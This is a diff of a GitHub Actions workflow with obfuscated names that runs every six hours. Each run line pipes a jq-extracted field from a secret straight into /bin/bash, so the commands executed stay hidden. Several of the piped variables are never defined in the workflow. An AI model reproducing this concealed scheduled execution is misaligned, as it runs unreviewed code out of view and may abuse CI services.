@@ -1,21 +1,19 @@
 name: chenliehui7815
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '30 1/6 * * *'
-
+    - cron: '3 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: chenliehui7815
         env:
-          w2: ${{ secrets.w2 }}
+          f1850: ${{ secrets.f1850 }}
         run: |
-          echo $w2 | jq -r .n19123 | /bin/bash
-          echo $hiq7790 | jq -r .pqq71 | /bin/bash
-          echo $dkr78 | jq -r .i886 | /bin/bash
+          echo $f1850 | jq -r .af0275 | /bin/bash
+          echo $kuvd7223 | jq -r .yay9 | /bin/bash
+          echo $hm0 | jq -r .e59396 | /bin/bash
+          echo $k3 | jq -r .icokx799 | /bin/bash
 
